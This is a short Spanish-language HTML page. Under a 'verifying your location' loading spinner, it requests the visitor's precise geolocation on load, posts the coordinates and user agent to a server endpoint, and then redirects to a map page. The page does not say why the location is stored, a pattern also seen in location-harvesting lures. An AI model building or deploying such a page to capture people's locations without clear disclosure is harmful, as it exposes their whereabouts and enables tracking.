<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p id="status">Verificando tu ubicación...</p>
    </div>

    <script>
        function guardarUbicacion(lat, lon, precision, userAgent) {
            fetch('/guardar', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    latitud: lat,
                    longitud: lon,
                    precision: precision,
                    user_agent: userAgent
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Guardado:', data);
            })
            .catch(error => {
                console.error('Error al guardar:', error);
            });
        }

        function getLocationAndRedirect() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const precision = position.coords.accuracy;
                        const userAgent = navigator.userAgent;

                        guardarUbicacion(lat, lon, precision, userAgent);

                        // Espera 1 segundo para dar tiempo al guardado antes de redirigir
                        setTimeout(function() {
                            window.location.href = '/mapa';
                        }, 1000);
                    },
                    function(error) {
                        // Si el usuario niega el permiso o hay error, redirige igual
                        console.error('Error de geolocalización:', error.message);
                        document.getElementById('status').innerText = 'No se pudo obtener la ubicación. Redirigiendo...';
                        setTimeout(function() {
                            window.location.href = '/mapa';
                        }, 1500);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Navegador sin soporte de geolocalización
                document.getElementById('status').innerText = 'Geolocalización no soportada. Redirigiendo...';
                setTimeout(function() {
                    window.location.href = '/mapa';
                }, 1500);
            }
        }

        // Ejecuta al cargar la página
        window.onload = getLocationAndRedirect;
    </script>
</body>
</html>
